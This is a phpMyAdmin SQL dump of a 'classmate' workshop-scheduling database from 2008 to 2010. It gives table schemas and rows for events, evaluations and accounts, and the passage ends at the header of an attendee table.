-- phpMyAdmin SQL Dump
-- version 3.2.0
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Jan 15, 2010 at 01:30 PM
-- Server version: 5.1.32
-- PHP Version: 5.3.0

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";

--
-- Database: `classmate`
--

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_account_attributes`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_account_attributes` (
  `accountId` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`accountId`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `oit_tbl_account_attributes`
--

INSERT INTO `oit_tbl_account_attributes` (`accountId`) VALUES
(1),
(2942);

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_api_log`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_api_log` (
  `apiLogId` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `userId` varchar(16) NOT NULL DEFAULT '',
  `function` varchar(64) NOT NULL DEFAULT '',
  `args` text NOT NULL,
  `message` varchar(255) NOT NULL DEFAULT '',
  `priority` varchar(16) NOT NULL DEFAULT '',
  `priorityName` varchar(64) NOT NULL DEFAULT '',
  `timestamp` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`apiLogId`),
  KEY `userId` (`userId`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Dumping data for table `oit_tbl_api_log`
--


-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_evaluation`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_evaluation` (
  `evaluationId` int(11) NOT NULL AUTO_INCREMENT,
  `eventId` int(11) NOT NULL DEFAULT '0',
  `timestamp` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`evaluationId`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=328 ;

--
-- Dumping data for table `oit_tbl_evaluation`
--

INSERT INTO `oit_tbl_evaluation` (`evaluationId`, `eventId`, `timestamp`) VALUES
(27, 156, 1208895544),
(28, 154, 1208964927),
(29, 145, 1208976826),
(30, 145, 1208976865),
(31, 145, 1208976918),
(32, 145, 1208976950),
(33, 145, 1208976988),
(34, 145, 1208977025),
(35, 145, 1208977039),
(36, 145, 1208977064),
(37, 145, 1208977068),
(38, 145, 1208977132),
(39, 145, 1208977163),
(40, 145, 1208977233),
(41, 145, 1208977250),
(42, 146, 1209569409),
(43, 146, 1209569599),
(44, 146, 1209569619),
(45, 146, 1209569625),
(46, 146, 1209569632),
(47, 146, 1209569650),
(48, 146, 1209569679),
(49, 146, 1209569732),
(50, 146, 1209569757),
(51, 146, 1209569800),
(52, 146, 1209569931),
(53, 151, 1211398452),
(54, 151, 1211398467),
(55, 151, 1211398481),
(56, 151, 1211398555),
(57, 151, 1211398561),
(58, 151, 1211398680),
(59, 151, 1211398686),
(60, 151, 1211398755),
(61, 152, 1212003121),
(62, 152, 1212003131),
(63, 152, 1212003160),
(64, 152, 1212003192),
(65, 152, 1212003197),
(66, 152, 1212003203),
(67, 152, 1212003317),
(68, 152, 1212003346),
(69, 152, 1212003440),
(70, 152, 1212003463),
(71, 152, 1212003467),
(72, 152, 1212003521),
(73, 157, 1214502331),
(74, 157, 1214509872),
(75, 168, 1220989935),
(76, 185, 1224096793),
(77, 185, 1224096969),
(78, 194, 1224257012),
(79, 194, 1224257363),
(80, 194, 1224258069),
(81, 183, 1224532509),
(82, 183, 1224532533),
(83, 183, 1224532646),
(84, 183, 1224532657),
(85, 183, 1224592131),
(86, 195, 1224861521),
(87, 195, 1224862090),
(88, 195, 1224862246),
(89, 195, 1224862414),
(90, 184, 1225136633),
(91, 184, 1225136666),
(92, 184, 1225136856),
(93, 196, 1225469296),
(94, 196, 1225469371),
(95, 196, 1225469485),
(96, 197, 1226074949),
(97, 197, 1226075171),
(98, 197, 1226075373),
(99, 188, 1226347675),
(100, 188, 1226347708),
(101, 188, 1226347725),
(102, 188, 1226347743),
(103, 188, 1226347802),
(104, 188, 1226347820),
(105, 188, 1226347829),
(106, 188, 1226347834),
(107, 188, 1226347864),
(108, 188, 1226347876),
(109, 188, 1226347911),
(111, 199, 1226513259),
(112, 202, 1227017088),
(113, 192, 1228489118),
(114, 192, 1228497639),
(115, 190, 1228926042),
(116, 215, 1228942142),
(117, 215, 1229000473),
(118, 190, 1229006527),
(119, 215, 1229012954),
(120, 215, 1229022920),
(121, 193, 1229090724),
(122, 193, 1229097406),
(123, 193, 1229097423),
(124, 193, 1229097427),
(125, 193, 1229097455),
(126, 193, 1229097477),
(127, 200, 1229374915),
(128, 200, 1229375002),
(129, 200, 1229375242),
(130, 220, 1229627347),
(131, 224, 1234212966),
(132, 224, 1234213079),
(133, 224, 1234213107),
(134, 224, 1234213126),
(135, 224, 1234213248),
(136, 224, 1234213274),
(137, 224, 1234214692),
(138, 224, 1234282085),
(139, 223, 1234289662),
(140, 223, 1234290200),
(141, 223, 1234291005),
(142, 223, 1234292430),
(143, 223, 1234294315),
(144, 223, 1234362010),
(145, 228, 1234370659),
(146, 228, 1234370946),
(147, 223, 1234383125),
(148, 229, 1234383200),
(149, 229, 1234383278),
(150, 229, 1234383541),
(151, 229, 1234383542),
(152, 229, 1234384333),
(153, 229, 1234385268),
(154, 229, 1234387126),
(155, 229, 1234387804),
(156, 229, 1234399347),
(157, 229, 1234443167),
(158, 225, 1234818409),
(159, 225, 1234818515),
(160, 225, 1234818536),
(161, 225, 1234818649),
(163, 225, 1234842972),
(164, 225, 1234875996),
(165, 231, 1234889018),
(166, 231, 1234890431),
(167, 231, 1234890529),
(168, 231, 1234890530),
(169, 231, 1234890569),
(170, 231, 1234890630),
(171, 225, 1234893006),
(172, 231, 1234898263),
(173, 255, 1234964931),
(174, 255, 1234965004),
(175, 255, 1234966588),
(176, 255, 1234967406),
(177, 255, 1234969714),
(178, 255, 1234970253),
(179, 255, 1234972688),
(180, 255, 1234974875),
(181, 227, 1235147569),
(182, 227, 1235147574),
(183, 227, 1235147693),
(184, 227, 1235147705),
(185, 227, 1235147707),
(186, 227, 1235148174),
(187, 227, 1235148201),
(188, 226, 1235421493),
(189, 226, 1235422678),
(190, 226, 1235422916),
(191, 226, 1235422945),
(192, 226, 1235429169),
(193, 226, 1235486330),
(195, 232, 1235493367),
(196, 232, 1235493624),
(197, 232, 1235493674),
(198, 232, 1235493734),
(199, 232, 1235493946),
(200, 232, 1235494279),
(201, 232, 1235494340),
(202, 232, 1235494458),
(203, 232, 1235494819),
(204, 232, 1235516320),
(205, 230, 1235579985),
(206, 230, 1235580035),
(207, 230, 1235580042),
(208, 230, 1235580065),
(209, 230, 1235580073),
(210, 230, 1235580139),
(212, 230, 1235580181),
(213, 230, 1235580222),
(214, 230, 1235580399),
(215, 230, 1235580547),
(216, 226, 1235583641),
(217, 256, 1235583675),
(218, 256, 1235589297),
(219, 256, 1235663069),
(220, 256, 1235670108),
(221, 256, 1235682455),
(223, 256, 1235745192),
(224, 258, 1235753572),
(225, 258, 1235753814),
(226, 258, 1235761478),
(227, 258, 1235764963),
(229, 233, 1236105023),
(230, 233, 1236170076),
(231, 257, 1236198512),
(232, 257, 1236198697),
(233, 257, 1236200747),
(234, 233, 1236215727),
(235, 257, 1236355613),
(236, 237, 1236356679),
(237, 237, 1236356861),
(238, 237, 1236362536),
(239, 237, 1236371681),
(240, 234, 1236699562),
(241, 234, 1236699844),
(242, 260, 1236800101),
(243, 260, 1236884115),
(244, 238, 1236963179),
(245, 238, 1236999686),
(246, 240, 1237304167),
(247, 240, 1237304185),
(248, 240, 1237304225),
(250, 240, 1237306276),
(251, 240, 1237306282),
(252, 262, 1237483859),
(253, 249, 1237839569),
(254, 249, 1237839683),
(255, 249, 1237839697),
(256, 249, 1237839741),
(257, 249, 1237839747),
(259, 249, 1237839779),
(260, 249, 1237839845),
(261, 249, 1237839847),
(262, 249, 1237839901),
(263, 263, 1238443216),
(264, 263, 1238443248),
(265, 263, 1238444240),
(266, 263, 1238444480),
(267, 263, 1238444499),
(268, 263, 1238444547),
(269, 251, 1239047316),
(270, 245, 1239116405),
(271, 245, 1239117608),
(272, 245, 1239117831),
(273, 245, 1239117848),
(275, 245, 1239117858),
(276, 245, 1239117898),
(277, 245, 1239118070),
(278, 245, 1239118466),
(279, 241, 1239220963),
(280, 241, 1239220981),
(281, 241, 1239221002),
(282, 241, 1239221171),
(283, 241, 1239221185),
(284, 241, 1239221215),
(285, 241, 1239221249),
(286, 241, 1239222355),
(287, 244, 1239288346),
(288, 244, 1239295352),
(289, 244, 1239297775),
(290, 246, 1239723073),
(291, 246, 1239723212),
(292, 246, 1239723729),
(293, 246, 1239724185),
(294, 246, 1239729343),
(295, 246, 1239730133),
(296, 242, 1239825706),
(297, 242, 1239825774),
(298, 242, 1239828218),
(299, 242, 1239884624),
(300, 242, 1239894988),
(301, 242, 1239906034),
(302, 247, 1240328664),
(303, 247, 1240328701),
(304, 247, 1240328757),
(305, 247, 1240328763),
(306, 247, 1240329217),
(307, 247, 1240337428),
(308, 243, 1240430474),
(309, 243, 1240430479),
(310, 243, 1240430525),
(311, 243, 1240430553),
(312, 243, 1240430696),
(313, 243, 1240489742),
(314, 243, 1240489795),
(315, 248, 1240930466),
(316, 248, 1240931039),
(317, 248, 1240931136),
(318, 266, 1240949628),
(319, 266, 1240949859),
(320, 266, 1240951212),
(321, 266, 1240952616),
(322, 266, 1241009951),
(323, 271, 1241115234),
(324, 268, 1241788523),
(327, 306, 1243430809);

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_evaluation_user`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_evaluation_user` (
  `eventId` int(11) NOT NULL DEFAULT '0',
  `accountId` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`eventId`,`accountId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `oit_tbl_evaluation_user`
--

INSERT INTO `oit_tbl_evaluation_user` (`eventId`, `accountId`) VALUES
(306, 2294);

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_event`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_event` (
  `eventId` int(11) NOT NULL AUTO_INCREMENT,
  `workshopId` int(11) NOT NULL DEFAULT '0',
  `locationId` int(11) NOT NULL DEFAULT '0',
  `date` date NOT NULL DEFAULT '0000-00-00',
  `startTime` time NOT NULL DEFAULT '00:00:00',
  `endTime` time NOT NULL DEFAULT '00:00:00',
  `maxSize` int(11) NOT NULL DEFAULT '0',
  `minSize` int(11) NOT NULL DEFAULT '0',
  `roleSize` int(10) unsigned NOT NULL DEFAULT '0',
  `waitlistSize` int(11) NOT NULL DEFAULT '0',
  `waitlistTotal` int(11) NOT NULL DEFAULT '0',
  `totalAttendance` int(11) NOT NULL DEFAULT '0',
  `status` enum('open','closed','canceled') NOT NULL DEFAULT 'open',
  PRIMARY KEY (`eventId`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=312 ;

--
-- Dumping data for table `oit_tbl_event`
--

INSERT INTO `oit_tbl_event` (`eventId`, `workshopId`, `locationId`, `date`, `startTime`, `endTime`, `maxSize`, `minSize`, `roleSize`, `waitlistSize`, `waitlistTotal`, `totalAttendance`, `status`) VALUES
(145, 38, 7, '2008-04-23', '13:00:00', '16:00:00', 15, 0, 17, 10, 10, 0, 'open'),
(146, 39, 7, '2008-04-30', '09:00:00', '12:00:00', 15, 0, 15, 10, 2, 0, 'open'),
(147, 40, 7, '2008-04-12', '08:00:00', '09:00:00', 2, 2, 0, 1, 0, 0, 'canceled'),
(148, 40, 7, '2008-04-12', '08:00:00', '18:00:00', 3, 2, 3, 1, 0, 0, 'open'),
(149, 39, 9, '2008-05-21', '13:30:00', '16:30:00', 15, 4, 0, 10, 0, 0, 'canceled'),
(150, 38, 9, '2008-05-28', '13:30:00', '16:30:00', 15, 4, 0, 10, 0, 0, 'canceled'),
(151, 38, 9, '2008-05-21', '13:30:00', '16:30:00', 15, 4, 15, 15, 5, 0, 'open'),
(152, 39, 9, '2008-05-28', '13:30:00', '16:30:00', 15, 4, 15, 10, 4, 0, 'open'),
(153, 40, 7, '2008-04-25', '09:00:00', '10:00:00', 1, 0, 0, 1, 0, 0, 'canceled'),
(154, 40, 7, '2008-04-22', '10:30:00', '12:30:00', 5, 5, 4, 5, 0, 0, 'open'),
(155, 40, 7, '2008-04-25', '13:00:00', '15:00:00', 15, 4, 0, 10, 0, 0, 'canceled'),
(156, 40, 7, '2008-04-22', '16:15:00', '16:20:00', 15, 4, 1, 10, 0, 0, 'open'),
(157, 54, 13, '2008-06-25', '14:00:00', '16:30:00', 12, 0, 12, 100, 7, 0, 'open'),
(158, 55, 14, '2008-06-16', '12:55:00', '15:55:00', 25, 5, 0, 10, 0, 0, 'canceled'),
(159, 55, 14, '2008-06-16', '13:00:00', '16:00:00', 25, 5, 19, 10, 0, 0, 'open'),
(160, 54, 13, '2008-07-10', '14:00:00', '16:30:00', 12, 5, 11, 100, 0, 0, 'open'),
(161, 56, 9, '2008-07-24', '09:30:00', '11:30:00', 25, 5, 25, 10, 0, 0, 'open'),
(162, 56, 9, '2008-07-28', '13:30:00', '15:30:00', 25, 5, 21, 10, 0, 0, 'open'),
(163, 54, 13, '2008-07-23', '14:00:00', '16:30:00', 10, 4, 4, 50, 0, 0, 'open'),
(164, 57, 15, '2008-08-12', '14:00:00', '15:00:00', 110, 5, 69, 50, 0, 0, 'open'),
(165, 57, 15, '2008-08-13', '11:30:00', '12:30:00', 110, 5, 59, 50, 0, 0, 'open'),
(166, 57, 15, '2008-08-14', '09:00:00', '10:00:00', 110, 5, 107, 50, 0, 0, 'open'),
(167, 58, 16, '2008-08-31', '23:00:00', '00:00:00', 300, 0, 22, 0, 0, 0, 'canceled'),
(168, 59, 17, '2008-09-09', '13:00:00', '14:30:00', 10, 0, 10, 5, 0, 0, 'open'),
(169, 59, 17, '2008-09-10', '10:00:00', '11:30:00', 10, 0, 8, 8, 0, 0, 'open'),
(170, 59, 17, '2008-09-10', '13:00:00', '14:30:00', 10, 0, 1, 8, 0, 0, 'open'),
(171, 59, 17, '2008-09-11', '10:00:00', '11:30:00', 10, 0, 6, 8, 0, 0, 'open'),
(172, 57, 18, '2008-09-04', '16:00:00', '17:00:00', 25, 0, 22, 5, 0, 0, 'open'),
(173, 57, 18, '2008-09-12', '16:00:00', '17:00:00', 25, 0, 9, 10, 0, 0, 'open'),
(174, 60, 19, '2008-09-10', '12:00:00', '13:00:00', 25, 5, 16, 5, 0, 0, 'open'),
(175, 61, 19, '2008-10-01', '12:00:00', '13:00:00', 25, 5, 23, 5, 0, 0, 'open'),
(176, 62, 17, '2008-09-18', '13:00:00', '15:00:00', 10, 5, 0, 5, 0, 0, 'canceled'),
(177, 62, 17, '2008-09-19', '13:00:00', '15:00:00', 10, 0, 0, 5, 0, 0, 'canceled'),
(178, 62, 9, '2008-09-18', '13:00:00', '15:00:00', 15, 5, 13, 5, 0, 0, 'open'),
(179, 62, 9, '2008-09-19', '13:00:00', '15:00:00', 15, 5, 15, 5, 0, 0, 'open'),
(180, 63, 20, '2008-09-30', '10:00:00', '11:30:00', 15, 5, 0, 5, 0, 0, 'canceled'),
(181, 52, 9, '2008-10-03', '09:00:00', '10:30:00', 14, 5, 10, 5, 0, 0, 'open'),
(182, 48, 8, '2008-10-13', '13:30:00', '16:00:00', 12, 5, 5, 5, 0, 0, 'open'),
(183, 49, 8, '2008-10-20', '13:30:00', '16:00:00', 13, 5, 9, 5, 0, 0, 'open'),
(184, 50, 8, '2008-10-27', '13:30:00', '16:00:00', 13, 5, 5, 5, 0, 0, 'open'),
(185, 43, 8, '2008-10-15', '13:30:00', '15:30:00', 13, 5, 5, 5, 0, 0, 'open'),
(186, 42, 8, '2008-10-22', '09:00:00', '12:00:00', 10, 5, 7, 5, 0, 0, 'open'),
(187, 42, 8, '2008-11-06', '09:00:00', '12:00:00', 12, 5, 6, 5, 0, 0, 'open'),
(188, 43, 8, '2008-11-10', '13:30:00', '15:30:00', 15, 5, 14, 5, 0, 0, 'open'),
(189, 42, 8, '2008-12-03', '09:00:00', '12:00:00', 13, 5, 2, 5, 0, 0, 'open'),
(190, 49, 8, '2008-12-10', '09:00:00', '11:30:00', 15, 5, 11, 5, 0, 0, 'open'),
(191, 43, 8, '2008-12-11', '09:00:00', '11:00:00', 13, 5, 7, 5, 0, 0, 'open'),
(192, 48, 8, '2008-12-05', '09:00:00', '11:30:00', 15, 5, 14, 5, 1, 0, 'open'),
(193, 50, 8, '2008-12-12', '09:00:00', '11:30:00', 13, 5, 10, 5, 0, 0, 'open'),
(194, 44, 8, '2008-10-17', '09:00:00', '12:00:00', 10, 5, 4, 5, 0, 0, 'open'),
(195, 45, 8, '2008-10-24', '09:00:00', '12:00:00', 10, 5, 5, 5, 0, 0, 'open'),
(196, 46, 8, '2008-10-31', '09:00:00', '11:30:00', 10, 5, 4, 5, 0, 0, 'open'),
(197, 47, 8, '2008-11-07', '09:00:00', '11:30:00', 10, 5, 5, 5, 0, 0, 'open'),
(198, 51, 8, '2008-10-23', '09:00:00', '11:30:00', 13, 5, 3, 5, 0, 0, 'canceled'),
(199, 51, 8, '2008-11-12', '09:00:00', '11:30:00', 13, 5, 7, 5, 0, 0, 'open'),
(200, 51, 8, '2008-12-15', '13:30:00', '16:00:00', 13, 5, 5, 5, 0, 0, 'open'),
(201, 64, 8, '2008-10-22', '13:30:00', '14:30:00', 15, 5, 1, 5, 0, 0, 'canceled'),
(202, 64, 8, '2008-11-17', '13:30:00', '14:30:00', 15, 5, 2, 5, 0, 0, 'open'),
(203, 64, 8, '2008-12-03', '13:30:00', '14:30:00', 15, 5, 6, 5, 0, 0, 'open'),
(204, 65, 9, '2008-10-14', '09:30:00', '11:30:00', 15, 5, 14, 5, 0, 0, 'open'),
(205, 41, 14, '2008-10-11', '10:00:00', '12:00:00', 15, 5, 1, 5, 0, 0, 'canceled'),
(206, 66, 8, '2008-10-21', '09:00:00', '11:30:00', 10, 5, 6, 5, 0, 0, 'open'),
(207, 64, 19, '2008-10-23', '12:00:00', '13:00:00', 15, 5, 1, 5, 0, 0, 'canceled'),
(208, 68, 19, '2008-10-29', '12:15:00', '12:45:00', 15, 5, 5, 5, 0, 0, 'open'),
(209, 64, 19, '2008-10-23', '12:00:00', '13:00:00', 15, 5, 0, 5, 0, 0, 'canceled'),
(210, 69, 19, '2008-10-23', '12:00:00', '13:00:00', 15, 5, 15, 5, 0, 0, 'open'),
(211, 70, 9, '2008-11-25', '09:00:00', '11:00:00', 30, 5, 22, 5, 0, 0, 'open'),
(212, 71, 19, '2008-11-12', '12:00:00', '13:00:00', 15, 5, 0, 5, 0, 0, 'canceled'),
(213, 72, 19, '2008-11-21', '12:15:00', '12:45:00', 15, 5, 10, 5, 0, 0, 'open'),
(214, 71, 19, '2008-11-12', '12:15:00', '12:45:00', 15, 5, 6, 5, 0, 0, 'open'),
(215, 74, 21, '2008-12-10', '13:00:00', '15:00:00', 25, 5, 26, 0, 0, 0, 'open'),
(216, 75, 21, '2008-12-17', '13:00:00', '16:00:00', 25, 5, 26, 0, 0, 0, 'open'),
(217, 65, 10, '2008-12-16', '09:00:00', '11:00:00', 15, 5, 9, 5, 0, 0, 'open'),
(218, 76, 22, '2008-12-18', '14:00:00', '16:30:00', 15, 5, 0, 5, 0, 0, 'canceled'),
(219, 76, 22, '2008-12-18', '14:00:00', '15:00:00', 100, 5, 43, 5, 0, 0, 'open'),
(220, 77, 19, '2008-12-18', '12:15:00', '12:45:00', 15, 5, 12, 5, 0, 0, 'open'),
(221, 78, 19, '2009-01-13', '12:15:00', '12:45:00', 15, 5, 15, 5, 0, 0, 'open'),
(222, 82, 19, '2009-01-22', '12:15:00', '12:45:00', 15, 5, 2, 5, 0, 0, 'canceled'),
(223, 83, 19, '2009-02-10', '12:15:00', '12:45:00', 25, 5, 26, 5, 0, 0, 'open'),
(224, 48, 8, '2009-02-09', '13:30:00', '16:00:00', 15, 5, 15, 5, 4, 0, 'open'),
(225, 49, 8, '2009-02-16', '13:30:00', '16:00:00', 15, 5, 10, 5, 0, 0, 'open'),
(226, 50, 8, '2009-02-23', '13:30:00', '16:00:00', 15, 5, 8, 5, 0, 0, 'open'),
(227, 51, 8, '2009-02-20', '09:00:00', '11:30:00', 15, 5, 13, 5, 0, 0, 'open'),
(228, 42, 8, '2009-02-11', '09:00:00', '12:00:00', 15, 5, 3, 5, 0, 0, 'open'),
(229, 43, 8, '2009-02-11', '13:30:00', '15:30:00', 15, 5, 13, 5, 0, 0, 'open'),
(230, 84, 8, '2009-02-25', '09:00:00', '12:00:00', 15, 5, 13, 5, 0, 0, 'open'),
(231, 44, 8, '2009-02-17', '09:00:00', '12:00:00', 12, 5, 12, 5, 3, 0, 'open'),
(232, 45, 8, '2009-02-24', '09:00:00', '12:00:00', 12, 5, 12, 5, 2, 0, 'open'),
(233, 46, 8, '2009-03-03', '09:00:00', '12:00:00', 12, 5, 9, 5, 0, 0, 'open'),
(234, 47, 8, '2009-03-10', '09:00:00', '11:30:00', 12, 5, 3, 5, 0, 0, 'open'),
(235, 43, 8, '2009-03-02', '13:30:00', '16:00:00', 15, 5, 0, 5, 0, 0, 'canceled'),
(236, 42, 8, '2009-02-05', '09:00:00', '12:00:00', 15, 5, 0, 5, 0, 0, 'canceled'),
(237, 48, 8, '2009-03-06', '09:00:00', '11:30:00', 15, 5, 11, 5, 0, 0, 'open'),
(238, 49, 8, '2009-03-13', '09:00:00', '11:30:00', 15, 5, 10, 5, 0, 0, 'open'),
(239, 50, 8, '2009-03-20', '09:00:00', '11:30:00', 15, 5, 7, 5, 0, 0, 'open'),
(240, 51, 8, '2009-03-17', '09:00:00', '11:30:00', 15, 5, 9, 5, 0, 0, 'open'),
(241, 48, 8, '2009-04-08', '13:30:00', '16:00:00', 15, 5, 14, 5, 0, 0, 'open'),
(242, 49, 8, '2009-04-15', '13:30:00', '16:00:00', 15, 5, 14, 5, 0, 0, 'open'),
(243, 50, 8, '2009-04-22', '13:30:00', '16:00:00', 15, 5, 14, 5, 0, 0, 'open'),
(244, 43, 8, '2009-04-09', '09:00:00', '11:00:00', 15, 5, 13, 5, 0, 0, 'open'),
(245, 44, 8, '2009-04-07', '09:00:00', '12:00:00', 12, 5, 13, 5, 5, 0, 'open'),
(246, 45, 8, '2009-04-14', '09:00:00', '12:00:00', 12, 5, 10, 5, 1, 0, 'open'),
(247, 46, 8, '2009-04-21', '09:00:00', '12:00:00', 12, 5, 12, 5, 2, 0, 'open'),
(248, 47, 8, '2009-04-28', '09:00:00', '12:00:00', 12, 5, 10, 5, 0, 0, 'open'),
(249, 85, 8, '2009-03-23', '13:30:00', '16:30:00', 10, 5, 10, 5, 1, 0, 'open'),
(250, 86, 8, '2009-03-23', '13:30:00', '16:30:00', 0, 0, 0, 0, 0, 0, 'canceled'),
(251, 87, 8, '2009-04-06', '13:30:00', '16:30:00', 10, 5, 8, 5, 0, 0, 'open'),
(252, 88, 8, '2009-04-13', '13:30:00', '16:30:00', 0, 0, 8, 0, 0, 0, 'open'),
(253, 89, 8, '2009-04-30', '09:00:00', '12:00:00', 10, 5, 11, 5, 2, 0, 'open'),
(254, 90, 8, '2009-05-07', '09:00:00', '12:00:00', 0, 0, 3, 0, 0, 0, 'open'),
(255, 91, 19, '2009-02-17', '12:15:00', '12:45:00', 25, 5, 22, 5, 0, 0, 'open'),
(256, 92, 19, '2009-02-25', '12:15:00', '12:45:00', 25, 5, 24, 5, 0, 0, 'open'),
(257, 43, 8, '2009-03-04', '13:30:00', '15:30:00', 15, 5, 12, 5, 0, 0, 'open'),
(258, 84, 8, '2009-02-27', '09:00:00', '12:00:00', 13, 5, 10, 5, 0, 0, 'open'),
(259, 42, 8, '2009-04-08', '09:00:00', '12:00:00', 15, 5, 10, 5, 0, 0, 'open'),
(260, 91, 19, '2009-03-11', '12:15:00', '13:00:00', 25, 5, 13, 5, 0, 0, 'open'),
(261, 83, 19, '2009-03-23', '12:15:00', '13:00:00', 25, 5, 16, 5, 0, 0, 'open'),
(262, 94, 13, '2009-03-19', '08:30:00', '11:30:00', 21, 0, 21, 10, 9, 0, 'open'),
(263, 86, 8, '2009-03-30', '13:30:00', '16:30:00', 0, 0, 7, 0, 0, 0, 'open'),
(264, 97, 8, '2009-04-17', '09:00:00', '10:30:00', 15, 5, 10, 5, 0, 0, 'open'),
(265, 97, 8, '2009-04-29', '15:00:00', '16:30:00', 15, 5, 14, 5, 0, 0, 'open'),
(266, 98, 19, '2009-04-28', '12:15:00', '13:00:00', 20, 5, 19, 5, 0, 0, 'open'),
(267, 99, 19, '2009-05-05', '12:15:00', '13:00:00', 20, 5, 11, 5, 0, 0, 'open'),
(268, 43, 8, '2009-05-07', '13:30:00', '15:30:00', 15, 5, 9, 5, 0, 0, 'open'),
(269, 97, 8, '2009-05-06', '09:00:00', '10:30:00', 15, 5, 15, 5, 0, 0, 'open'),
(270, 40, 14, '2009-04-20', '12:00:00', '13:00:00', 1, 5, 0, 5, 0, 0, 'canceled'),
(271, 100, 23, '2009-04-28', '09:30:00', '11:30:00', 30, 5, 24, 5, 0, 0, 'open'),
(272, 104, 26, '2009-05-18', '09:00:00', '12:00:00', 16, 5, 11, 5, 0, 0, 'open'),
(273, 104, 26, '2009-05-18', '13:30:00', '16:30:00', 17, 5, 11, 5, 0, 0, 'open'),
(274, 104, 26, '2009-05-21', '09:00:00', '12:00:00', 17, 5, 4, 5, 0, 0, 'open'),
(275, 104, 26, '2009-05-21', '13:30:00', '16:30:00', 17, 5, 5, 5, 0, 0, 'open'),
(276, 104, 26, '2009-05-22', '09:00:00', '12:00:00', 17, 5, 3, 5, 0, 0, 'open'),
(277, 104, 26, '2009-05-22', '13:30:00', '16:30:00', 17, 5, 0, 5, 0, 0, 'open'),
(278, 104, 26, '2009-05-27', '09:00:00', '12:00:00', 17, 5, 0, 5, 0, 0, 'open'),
(279, 104, 26, '2009-05-27', '13:30:00', '16:30:00', 17, 5, 0, 5, 0, 0, 'open'),
(280, 104, 26, '2009-05-28', '09:00:00', '12:00:00', 17, 5, 1, 5, 0, 0, 'open'),
(281, 104, 26, '2009-05-28', '13:30:00', '16:30:00', 17, 5, 0, 5, 0, 0, 'open'),
(282, 103, 24, '2009-05-07', '10:00:00', '11:30:00', 110, 5, 12, 5, 0, 0, 'open'),
(283, 103, 24, '2009-05-19', '10:00:00', '11:30:00', 110, 5, 0, 5, 0, 0, 'canceled'),
(284, 102, 24, '2009-05-19', '14:00:00', '15:30:00', 110, 5, 9, 5, 0, 0, 'open'),
(285, 103, 24, '2009-05-21', '10:00:00', '11:30:00', 110, 5, 0, 5, 0, 0, 'canceled'),
(286, 103, 24, '2009-05-26', '14:00:00', '15:30:00', 110, 5, 4, 5, 0, 0, 'open'),
(287, 102, 24, '2009-05-27', '10:00:00', '11:30:00', 110, 5, 2, 5, 0, 0, 'open'),
(288, 103, 24, '2009-05-27', '14:00:00', '15:30:00', 110, 5, 2, 5, 0, 0, 'open'),
(289, 102, 25, '2009-05-06', '14:00:00', '15:30:00', 100, 5, 11, 5, 0, 0, 'open'),
(290, 103, 25, '2009-05-11', '14:00:00', '15:30:00', 100, 5, 13, 5, 0, 0, 'open'),
(291, 103, 25, '2009-05-18', '14:00:00', '15:30:00', 110, 5, 0, 5, 0, 0, 'canceled'),
(292, 102, 15, '2009-05-12', '10:00:00', '11:30:00', 110, 5, 0, 20, 0, 0, 'canceled'),
(293, 103, 15, '2009-05-12', '14:00:00', '15:30:00', 150, 5, 18, 20, 0, 0, 'open'),
(294, 103, 15, '2009-05-13', '14:00:00', '15:30:00', 150, 5, 0, 20, 0, 0, 'canceled'),
(295, 103, 28, '2009-05-01', '10:00:00', '11:30:00', 75, 5, 4, 10, 0, 0, 'open'),
(296, 103, 27, '2009-04-30', '10:00:00', '11:30:00', 75, 5, 15, 10, 0, 0, 'open'),
(297, 106, 16, '2009-05-07', '15:00:00', '17:00:00', 18, 5, 17, 0, 0, 0, 'canceled'),
(298, 106, 25, '2009-05-12', '13:30:00', '15:30:00', 100, 5, 40, 10, 0, 0, 'open'),
(299, 105, 25, '2009-05-08', '09:30:00', '11:00:00', 7, 5, 6, 0, 0, 0, 'canceled'),
(300, 105, 25, '2009-05-13', '13:30:00', '15:00:00', 100, 5, 23, 10, 0, 0, 'open'),
(301, 43, 8, '2009-06-22', '13:30:00', '15:30:00', 15, 5, 1, 5, 0, 0, 'open'),
(302, 97, 8, '2009-05-22', '09:00:00', '11:00:00', 15, 5, 11, 5, 0, 0, 'open'),
(303, 106, 25, '2009-05-20', '15:00:00', '17:00:00', 100, 5, 10, 5, 0, 0, 'open'),
(304, 105, 25, '2009-05-21', '15:30:00', '17:00:00', 100, 5, 5, 5, 0, 0, 'open'),
(305, 107, 19, '2009-05-26', '12:15:00', '13:00:00', 20, 5, 3, 5, 0, 0, 'open'),
(306, 39, 25, '2009-05-26', '14:00:00', '15:00:00', 150, 5, 1, 10, 0, 0, 'open'),
(307, 75, 25, '2009-06-24', '14:25:00', '15:25:00', 150, 5, 0, 10, 0, 0, 'open'),
(308, 39, 18, '2009-10-01', '15:00:00', '16:00:00', 25, 5, 1, 10, 0, 0, 'open'),
(309, 75, 25, '2009-10-15', '11:00:00', '11:30:00', 150, 5, 0, 10, 0, 0, 'open'),
(310, 75, 25, '2009-10-21', '08:00:00', '09:05:00', 150, 5, 0, 10, 0, 0, 'open'),
(311, 43, 25, '2010-01-21', '09:00:00', '10:00:00', 150, 5, 0, 10, 0, 0, 'open');

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_event_attendee`
--

